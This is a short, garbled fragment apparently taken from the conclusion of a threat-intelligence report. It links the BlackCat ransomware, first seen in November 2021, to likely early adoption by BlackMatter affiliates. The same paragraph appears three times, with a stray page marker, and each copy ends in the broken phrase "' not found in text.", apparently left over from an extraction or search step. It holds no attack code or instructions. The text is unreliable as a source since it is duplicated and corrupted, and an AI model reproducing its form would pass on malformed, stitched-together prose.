conclusion

blackcat first surfaced in november 2021, with the attack we described here taking place in
december 2021. while we don't know how related blackcat is to blackmatter, we assess
with moderate confidence that based on the tools and techniques of these attacks and
overlapping infrastructure, blackmatter affiliates were likely among the early adopters of
blackcat.' not found in text.

11/15

blackcat first surfaced in november 2021, with the attack we described here taking place in
december 2021. while we don't know how related blackcat is to blackmatter, we assess
with moderate confidence that based on the tools and techniques of these attacks and
overlapping infrastructure, blackmatter affiliates were likely among the early adopters of
blackcat.' not found in text.

conclusion
11/15

blackcat first surfaced in november 2021, with the attack we described here taking place in
december 2021. while we don't know how related blackcat is to blackmatter, we assess
with moderate confidence that based on the tools and techniques of these attacks and
overlapping infrastructure, blackmatter affiliates were likely among the early adopters of
blackcat.' not found in text.
